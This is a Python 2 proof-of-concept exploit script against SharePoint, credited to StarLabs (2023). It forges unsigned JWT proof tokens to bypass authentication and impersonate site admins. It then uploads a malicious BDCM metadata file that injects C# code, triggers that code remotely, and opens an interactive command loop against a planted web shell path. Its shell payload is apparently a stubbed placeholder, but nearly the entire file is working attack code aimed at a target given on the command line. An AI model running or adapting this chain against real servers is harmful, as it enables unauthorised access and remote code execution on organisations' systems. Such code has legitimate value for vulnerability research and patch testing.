# -*- coding: utf-8 -*-
import hashlib
import base64
import requests, string, struct, uuid, random, re
import sys
from collections import OrderedDict
from sys import version
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

if version.startswith("3"):
	print("[!!!!] Aborttttt, require python2 to run, current python version is: " + version)
	exit(1)

import xml.etree.ElementTree as ET
from urlparse import urlparse
import logging
# logging setup
from logging import handlers
log = logging.getLogger('')
log.setLevel(logging.DEBUG)
format = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
fh = handlers.RotatingFileHandler("debug.log", maxBytes=(1048576*5), backupCount=7)
fh.setFormatter(format)
log.addHandler(fh)
# i don't know 
if len(sys.argv) != 2:
	print("Usage: python "+sys.argv[0]+" http://sp2019")
	print("It's recommended to use the site name instead of IPs")
	exit(1)
SITE_USER = "user2"
USER = ""
# USER = "operator"
# TARGET = "http://splab/"
SID_PREFIX=""
SID=""
TARGET = sys.argv[1]
PROXY = {}
REQUEST_DIGEST = "Nope"
BACKUP_BDCM = ""
CLASS_NAME = "testanull"
EXPLOIT_STATUS = False
HIJACK_SHELL = True
STS_ACCESSIBLE = True
USE_STS = True
SHELL_PATH = "/_vti_bin/DelveApi.ashx/gift_from_starlabs/ghostshell" + str(random.randint(1000,9999)) + ".aspx"
MAL_CODE = """aaab{
class ABCD: System.Web.Services.Protocols.HttpWebClientProtocol{
static ABCD(){
System.Diagnostics.Process.Start("cmd.exe", "/c mspaint.exe");
}
}
}
namespace aabcd"""


while TARGET.endswith("/"):
	TARGET = TARGET[:-1]

HOSTNAME = BACKUP_HOSTNAME = TARGET.replace("http://", "").replace("https://", "")
# I know, my code is dirty, but at least it works ¯\_(ツ)_/¯!

def logMsg(msg, printable=False):
	log.info(msg)
	if printable == True:
		print(msg)

# memory web shell
def getMalCode():
	global HIJACK_SHELL, CLASS_NAME, MAL_CODE
	CLASS_NAME = "x0r"
	if HIJACK_SHELL == True:
		MAL_CODE = base64.b64decode("aGFja3hvciBidXNmYW1lIGNvbGFiIHRvcCAxIA==").replace("ckxo", CLASS_NAME)
	return MAL_CODE


def id_generator(size=6, chars=string.ascii_lowercase + string.ascii_uppercase):
	return ''.join(random.choice(chars) for _ in range(size))

def parseNtlmMsg(msg):
	def decode_int(byte_string):
		return int(byte_string[::-1].encode('hex'), 16)

	def decode_string(byte_string):
		return byte_string.replace('\x00', '')

	target_info_fields  = msg[40:48]
	target_info_len     = decode_int(target_info_fields[0:2])
	target_info_offset  = decode_int(target_info_fields[4:8])
	target_info_bytes = msg[target_info_offset:target_info_offset+target_info_len]
	MsvAvEOL             = 0x0000
	MsvAvNbComputerName  = 0x0001
	MsvAvNbDomainName    = 0x0002
	MsvAvDnsComputerName = 0x0003
	MsvAvDnsDomainName   = 0x0004
	target_info = OrderedDict()
	info_offset = 0

	while info_offset < len(target_info_bytes):
		av_id = decode_int(target_info_bytes[info_offset:info_offset+2])
		av_len = decode_int(target_info_bytes[info_offset+2:info_offset+4])
		av_value = target_info_bytes[info_offset+4:info_offset+4+av_len]
		info_offset = info_offset + 4 + av_len
		if av_id == MsvAvEOL:
			pass
		elif av_id == MsvAvNbComputerName:
			target_info['MsvAvNbComputerName'] = decode_string(av_value)
		elif av_id == MsvAvNbDomainName:
			target_info['MsvAvNbDomainName'] = decode_string(av_value)
		elif av_id == MsvAvDnsComputerName:
			target_info['MsvAvDnsComputerName'] = decode_string(av_value)
		elif av_id == MsvAvDnsDomainName:
			target_info['MsvAvDnsDomainName'] = decode_string(av_value)
	return target_info

def resolveTargetInfo():
	burp0_url = TARGET + "/_api/web/"
	burp0_headers = { "Authorization": "NTLM TlRMTVNTUAABAAAAA7IIAAYABgAkAAAABAAEACAAAABIT1NURE9NQUlO", 
		  "Host": HOSTNAME}
	rq = requests.get(burp0_url, headers=burp0_headers, proxies=PROXY, verify=False, allow_redirects=False)
	if 'WWW-Authenticate' in rq.headers:
		_neg_response = rq.headers['WWW-Authenticate']
		if 'NTLM' in _neg_response:
			msg2 = base64.b64decode(_neg_response.split('NTLM ')[1])
			ntlm_resp = parseNtlmMsg(msg2)
			return ntlm_resp
		else:
			logMsg("[-] Target didn't use NTLM Auth, please check!")
			exit()
	else:
		logMsg("[-] Target didn't response to NTLM Auth, please check!")
		exit()


def getOAuthInfo():
	burp0_url = TARGET + "/_api/web"
	burp0_headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJuYmYiOiIxNjczNDEwMzM0IiwiZXhwIjoiMTY5MzQxMDMzNCJ9.YWFh", 
		  "Host": HOSTNAME}
	rq = requests.get(burp0_url, headers=burp0_headers, proxies=PROXY, verify=False, allow_redirects=False)
	if 'WWW-Authenticate' in rq.headers:
		msg = rq.headers['WWW-Authenticate']
		realm = msg.split('realm="')[1].split('"')[0]
		client_id = msg.split('client_id="')[1].split('"')[0]
		
		return realm, client_id
	else:
		logMsg("[-] No auth negotiate message, please check!")
		exit()


def genEndpointHash(url):
	url = url.lower()
	_hash = base64.b64encode(hashlib.sha256(url).digest())
	return _hash
	
def base64UrlEncode(data):
	return base64.urlsafe_b64encode(data).rstrip(b'=')

def genProofToken(url, username=""):
	if url.startswith('https://'):
		url = url.replace(TARGET, 'https://' + HOSTNAME)
	else:
		url = url.replace(TARGET, 'http://' + HOSTNAME)
	if SID == "":
		if username=="":
			username = USER
		jwt_token = '{"iss":"'+CLIENT_ID+'","aud":  "'+CLIENT_ID+'/'+HOSTNAME+'@'+REALM+'","nbf":"1673410334","exp":"1725093890","nameid":"c#.w|' + username + '", "http://schemas.microsoft.com/sharepoint/2009/08/claims/userlogonname":"'+ username +'", "appidacr":"0", "isuser":"0", "http://schemas.microsoft.com/office/2012/01/nameidissuer":"AccessToken", "ver":"hashedprooftoken","endpointurl": "'+genEndpointHash(url)+'", "isloopback": "true","userid":"llunatset", "appctx":"user_impersonation"}'
		b64_token = base64UrlEncode(jwt_token)
		proof_token = 'eyJhbGciOiAibm9uZSJ9.'+b64_token+'.YWFh'
		return proof_token
	else:
		return genTokenSid(url, SID)
	
def genAppProofToken(url, username=""):
	if url.startswith('https://'):
		url = url.replace(TARGET, 'https://' + HOSTNAME)
	else:
		url = url.replace(TARGET, 'http://' + HOSTNAME)
	if SID == "":
		if username=="":
			username = USER
		jwt_token = '{"iss":"'+CLIENT_ID+'","aud":  "'+CLIENT_ID+'/'+HOSTNAME+'@'+REALM+'","nbf":"1673410334","exp":"1725093890","nameid":"c#.w|' + username + '", "http://schemas.microsoft.com/sharepoint/2009/08/claims/userlogonname":"'+ username +'", "appidacr":"0", "isuser":"0", "http://schemas.microsoft.com/office/2012/01/nameidissuer":"AccessToken", "ver":"hashedprooftoken","endpointurl": "'+genEndpointHash(url)+'", "isloopback": "true","userid":"llunatset", "appctx":"user_impersonation"}'
		jwt_token = '{"iss":"00000003-0000-0ff1-ce00-000000000000","aud":"00000003-0000-0ff1-ce00-000000000000@'+REALM+'","nbf":"1673410334","exp":"1725093890","nameid":"00000003-0000-0ff1-ce00-000000000000@'+REALM+'", "ver":"hashedprooftoken","endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=","endpointurlLength": 1, "isloopback": "true"}'
		b64_token = base64UrlEncode(jwt_token)
		proof_token = 'eyJhbGciOiAibm9uZSJ9.'+b64_token+'.YWFh'
		return proof_token
	else:
		return genTokenSid(url, SID)
	
def genTokenSid(url, sid):
	global SID_PREFIX
	if TARGET.startswith('https://'):
		url = url.replace(TARGET, 'https://' + HOSTNAME)
	else:
		url = url.replace(TARGET, 'http://' + HOSTNAME)

	jwt_token = '{"iss":"' + CLIENT_ID + '","aud":  "' + CLIENT_ID + '/' + HOSTNAME + '@' + REALM + '","nbf":"1673410334","exp":"1725093890","nameid": "' + sid +'", "nii": "urn:office:idp:activedirectory", "appidacr":"0", "isuser":"0", "ver":"hashedprooftoken","endpointurl": "' + genEndpointHash(url)+'","isloopback": "true","appctx":"user_impersonation"}'
	b64_token = base64UrlEncode(jwt_token)
	return 'eyJhbGciOiAibm9uZSJ9.'+b64_token+'.YWFh'

def tryLoginSid(sid):
	burp0_url = TARGET + "/_api/web/currentuser"
	token = genTokenSid(burp0_url, sid)
	burp0_headers = {"Host": HOSTNAME, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "python-requests/2.27.1", "X-PROOF_TOKEN": token, "Authorization": "Bearer "+token}
	try:
		rq = requests.get(burp0_url, headers=burp0_headers, proxies=PROXY)
		if rq.status_code == 200:
			logMsg("[+] Found user with sid: " + sid, True)
			return sid
		else:
			return False
	except:
		return False
	
def probeUser():
	global SID
	#try 500
	sid = SID_PREFIX + '-500'
	sid = tryLoginSid(sid)
	if sid != False:
		SID = sid
	else:
		#try 1100
		i = 1100
		while True:
			sid = SID_PREFIX + "-" + str(i)
			if tryLoginSid(sid):
				SID = sid
				break
			i = 1000 if i > 1200 else i + 1
			if i == 1100:
				break

def sendGetReq(url, user=""):
	token = genAppProofToken(url, user)
	headers={"X-PROOF_TOKEN": token,
			 "Authorization": "Bearer " + token,
			 "Host": HOSTNAME}
	rq = requests.get(url, headers=headers, proxies=PROXY, verify=False, allow_redirects=False)
	return rq

def sendJsonRequest(url, data):
	token = genAppProofToken(url)
	headers={"X-PROOF_TOKEN": token,
			 "Authorization": "Bearer " + token,
			 "Content-type": "application/json",
			 "Host": HOSTNAME }
	rq = requests.post(url, headers=headers, json=data, proxies=PROXY, verify=False, allow_redirects=False)
	return rq

def getCurrentUser():
	ct = sendGetReq(TARGET+"/_api/web/currentuser")
	if ct.status_code != 200:
		logMsg("[-] Failed to get current user", True)
		return False
	return ct.content

def getSiteAdmin():
	rq = sendGetReq(TARGET + "/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true")
	if rq.status_code != 200:
		print("[-] Failed to bypass authentication, abort!!")
		print("[-] Status_code is: "+ str(rq.status_code))
		print("[-] Page content: "+ rq.content)
		exit(1)

	ct = rq.content
	if "true</d:IsSiteAdmin>" not in ct:
		print("[-] Cannot get Site Admin")
		return False
	spl = ct.split('<entry')
	for i in spl:
		if "true</d:IsSiteAdmin>" in i:
			spl2 = i.split('<d:Account>')[1].split('</d:Account>')[0].split('|')[1]
			return spl2
		
def getSiteAdminFromMySite():
	global HOSTNAME
	rq = sendGetReq(TARGET + "/my/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true", "NT AUTHORITY\\\\LOCAL SERVICE")
	# sendGetReq(TARGET + "/my/_api/web/currentuser", "NT AUTHORITY\\\\LOCAL SERVICE")
	
	if rq.status_code != 200:
		if rq.status_code == 401:
			#bad site name
			HOSTNAME = BACKUP_HOSTNAME
			logMsg("[+] Wrong sharepoint site name, trying the original one", True)
		rq = sendGetReq(TARGET + "/my/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true", "NT AUTHORITY\\\\LOCAL SERVICE")
		if rq.status_code != 200:
			logMsg("[+] Wrong sharepoint site name, please check again!", True)
			return False
		
	ct = rq.content
	if "true</d:IsSiteAdmin>" not in ct:
		print("[-] Cannot get Site Admin")
		return False
	spl = ct.split('<entry')
	for i in spl:
		if "true</d:IsSiteAdmin>" in i:
			spl2 = i.split('<d:Account>')[1].split('</d:Account>')[0].split('|')[1]
			return spl2

def getSiteAdmin2():
	global HOSTNAME
	token = genAppProofToken(TARGET + "/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true")
	headers={"X-PROOF_TOKEN": token,
			 "Authorization": "Bearer " + token,
			 "Host": HOSTNAME}
	rq = requests.get(TARGET + "/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true", headers=headers, proxies=PROXY, verify=False, allow_redirects=False)
	# sendGetReq(TARGET + "/my/_api/web/currentuser", "NT AUTHORITY\\\\LOCAL SERVICE")
	
	if rq.status_code != 200:
		logMsg("[+] Wrong sharepoint site name, please check again!", True)
		return False
		
	ct = rq.content
	if "true</d:IsSiteAdmin>" not in ct:
		print("[-] Cannot get Site Admin")
		return False
	spl = ct.split('<entry')
	for i in spl:
		if "true</d:IsSiteAdmin>" in i:
			spl2 = i.split('<d:Account>')[1].split('</d:Account>')[0].split('|')[1]
			return spl2
				
def createBDCMpayload():
	global LOBID
	burp0_url = TARGET + "/_api/web/GetFolderByServerRelativeUrl('/BusinessDataMetadataCatalog/')/Files/add(url='/BusinessDataMetadataCatalog/BDCMetadata.bdcm',overwrite=true)"
	token = genAppProofToken(burp0_url)
	headers={"X-PROOF_TOKEN": token,
			 "Authorization": "Bearer " + token,
			 "Content-type": "application/x-www-form-urlencoded",
			 "Host": HOSTNAME}
	burp0_data = "<?xml version=\"1.0\" encoding=\"utf-8\"?><Model xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Name=\"BDCMetadata\" xmlns=\"http://schemas.microsoft.com/windows/2007/BusinessDataCatalog\"><LobSystems><LobSystem Name=\"" + LOBID + "\" Type=\"WebService\"><Properties><Property Name=\"WsdlFetchUrl\" Type=\"System.String\">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property><Property Name=\"WebServiceProxyNamespace\" Type=\"System.String\"><![CDATA[" + getMalCode() + "]]></Property><Property Name=\"WsdlFetchAuthenticationMode\" Type=\"System.String\">RevertToSelf</Property></Properties><LobSystemInstances><LobSystemInstance Name=\"" + LOBID + "\"></LobSystemInstance></LobSystemInstances><Entities><Entity Name=\"Products\" DefaultDisplayName=\"Products\" Namespace=\"ODataDemo\" Version=\"1.0.0.0\" EstimatedInstanceCount=\"2000\"><Properties><Property Name=\"ExcludeFromOfflineClientForList\" Type=\"System.String\">False</Property></Properties><Identifiers><Identifier Name=\"ID\" TypeName=\"System.Int32\" /></Identifiers><Methods><Method Name=\"ToString\" DefaultDisplayName=\"Create Product\" IsStatic=\"false\"><Parameters><Parameter Name=\"@ID\" Direction=\"In\"><TypeDescriptor Name=\"ID\" DefaultDisplayName=\"ID\" TypeName=\"System.String\" IdentifierName=\"ID\" CreatorField=\"true\" /></Parameter><Parameter Name=\"@CreateProduct\" Direction=\"Return\"><TypeDescriptor Name=\"CreateProduct\" TypeName=\"System.Object\"></TypeDescriptor></Parameter></Parameters><MethodInstances><MethodInstance Name=\"CreateProduct\" Type=\"GenericInvoker\" ReturnParameterName=\"@CreateProduct\"><AccessControlList><AccessControlEntry Principal=\"STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string\"><Right BdcRight=\"Execute\" /></AccessControlEntry></AccessControlList></MethodInstance></MethodInstances></Method></Methods></Entity></Entities></LobSystem></LobSystems></Model>"
	rq = requests.post(burp0_url, headers=headers, data=burp0_data, verify=False, allow_redirects=False, proxies=PROXY)
	return rq

def execCmd(_entityId, _liIdentity):
	burp0_url = TARGET + "/_vti_bin/client.svc/ProcessQuery"
	token = genAppProofToken(burp0_url)
	headers={"X-PROOF_TOKEN": token,
			 "Authorization": "Bearer " + token,
			 "Content-type": "application/x-www-form-urlencoded",
			 "Host": HOSTNAME}
	burp0_data = "<Request AddExpandoFieldTypeSuffix=\"true\" SchemaVersion=\"15.0.0.0\" LibraryVersion=\"16.0.0.0\" ApplicationName=\".NET Library\" xmlns=\"http://schemas.microsoft.com/sharepoint/clientquery/2009\"><Actions><ObjectPath Id=\"21\" ObjectPathId=\"20\" /><ObjectPath Id=\"23\" ObjectPathId=\"22\" /></Actions><ObjectPaths><Method Id=\"20\" ParentId=\"7\" Name=\"Execute\"><Parameters><Parameter Type=\"String\">CreateProduct</Parameter><Parameter ObjectPathId=\"17\" /><Parameter Type=\"Array\"><Object Type=\"String\">1</Object></Parameter></Parameters></Method><Property Id=\"22\" ParentId=\"20\" Name=\"ReturnParameterCollection\" /><Identity Id=\"7\" Name=\"" + _entityId + "\" /><Identity Id=\"17\" Name=\"" + _liIdentity + "\" /></ObjectPaths></Request>"
	rq = requests.post(burp0_url, headers=headers, data=burp0_data, verify=False, allow_redirects=False, proxies=PROXY)
	if rq.status_code == 200:
		return True
	else:
		return False

def spawnCmd():
	try:
		while True:
			cmd = raw_input("cmd > ").strip()
			if cmd.lower() in ['exit', 'quit']:
				exit(0)
			token = genAppProofToken(TARGET + SHELL_PATH)
			headers={"X-PROOF_TOKEN": token,
					"Authorization": "Bearer " + token,
					"Host": HOSTNAME,
					"cmd": cmd}
			rq = requests.get(TARGET + SHELL_PATH, headers=headers, verify=False, allow_redirects=False, proxies=PROXY)
			if rq.status_code == 401:
				logMsg("[-] w3wp.exe may crashed and the backdoor is gone, try exploiting again!", True)
				exit(0)
			print(rq.content)
	except:
		logMsg("[-] Exception while exec!", True)

print("[!] PoC by Jang (@testanull) from StarLabs 2023")
print("=========")

logMsg("[!] Attacking target: " + TARGET, True)
ntlm_resp = resolveTargetInfo()
HOSTNAME = sharepoint_site = ntlm_resp['MsvAvDnsComputerName'].split(".")[0]
domain = ntlm_resp['MsvAvNbDomainName']
logMsg("[!] Sharepoint site is: "+ sharepoint_site, True)
logMsg("[!] Domain: "+ domain, True)
REALM, CLIENT_ID = getOAuthInfo()


LOBID = id_generator(8)

_currentUser = getCurrentUser()
if _currentUser != False:
	_currentUser = _currentUser.split('<d:LoginName>')[1].split('</d:LoginName>')[0]
	if "|" in _currentUser:
		_currentUser = _currentUser.split('|')[1]
		USER = _currentUser
else:
	if STS_ACCESSIBLE == False:
		logMsg("[!!] Oh no, STS is not available!")	

logMsg("[+] Authentication bypassed!!!", True)

# if _getUserResp != False and 'true</d:IsSiteAdmin>' not in _getUserResp:
# 	logMsg("[+] Privilege escalating ...", True)
# 	_siteAdmin = getSiteAdmin()
# 	logMsg("[+] Found site admin: " + _siteAdmin, True)
# 	if _siteAdmin != False:
# 		USER = _siteAdmin.replace("\\", "\\\\")
# 		SID = ""

_currentUser = getCurrentUser()
if _currentUser != False:
	if 'true</d:IsSiteAdmin>' in _currentUser:
		logMsg("[+] Successful impersonate Site Admin: " + USER, True)
	_currentUser = _currentUser.split('<d:LoginName>')[1].split('</d:LoginName>')[0]
	if "|" in _currentUser:
		_currentUser = _currentUser.split('|')[1]

logMsg("[+] Got Oauth Info: " + REALM + "|" + CLIENT_ID)
logMsg("[+] Delivering payload ...", True)

rq = sendGetReq(TARGET + "/_api/web/GetFolderByServerRelativeUrl('/')/Folders")
if rq.status_code == 200 and 'BusinessDataMetadataCatalog' in rq.content:
	logMsg("[+] BDCMetadata existed, backuping original data.")
	try:
		rq = sendGetReq(TARGET + "/_api/web/GetFileByServerRelativePath(decodedurl='/BusinessDataMetadataCatalog/BDCMetadata.bdcm')/$value")
		BACKUP_BDCM = rq.content
		if rq.status_code == 200:
			try:
				f = open("bdcm.bak", "wb")
				f.write(rq.content)
				f.close()
			except:
				logMsg("[-] Failed to backup BDCM content, saving it to memory")
	except:
		pass
else:
	body = {
			"ServerRelativeUrl": "/BusinessDataMetadataCatalog/"
		}
	rq = sendJsonRequest(TARGET + '/_api/web/folders', body)
	if rq.status_code == 201:
		logMsg("[+] Created BDCM folder")
	else:
		logMsg("[-] Failed to create BDCM folder")
		
logMsg("[+] Lob_id: " + LOBID)	
_createBDCM = createBDCMpayload()
if _createBDCM.status_code == 200:
	logMsg("[+] Success delivered payload", True)

_entityId = str(uuid.uuid4()) + "|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo"
_lobSystemInstance = str(uuid.uuid4()) + "|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:" + LOBID + "," + LOBID
exp_rq = execCmd(_entityId, _lobSystemInstance)

if HIJACK_SHELL == True:
	token = genAppProofToken(TARGET + SHELL_PATH)
	headers={"X-PROOF_TOKEN": token,
			"Authorization": "Bearer " + token,
			"Host": HOSTNAME}
	rq = requests.get(TARGET + SHELL_PATH, verify=False, headers=headers, allow_redirects=False, proxies=PROXY)
	if rq.status_code == 200:
		logMsg("[+] Exploit successfully!", True)
		EXPLOIT_STATUS = True
	else:
		logMsg("[+] Can't reach the backdoor, take a manual check!", True)

logMsg("[+] Cleaning up!", True)

burp0_url = TARGET + "/_api/web/GetFolderByServerRelativeUrl('/BusinessDataMetadataCatalog/')/Files/add(url='/BusinessDataMetadataCatalog/BDCMetadata.bdcm',overwrite=true)"
token = genAppProofToken(burp0_url)
headers={"X-PROOF_TOKEN": token,
			"Authorization": "Bearer " + token,
			"Content-type": "application/x-www-form-urlencoded",
			"Host": HOSTNAME
			}
try:
	rq = requests.post(burp0_url, headers=headers, data=BACKUP_BDCM, verify=False, allow_redirects=False, proxies=PROXY)
except:
	logMsg("[-] Failed to restore original data")

if EXPLOIT_STATUS == True:
	spawnCmd()
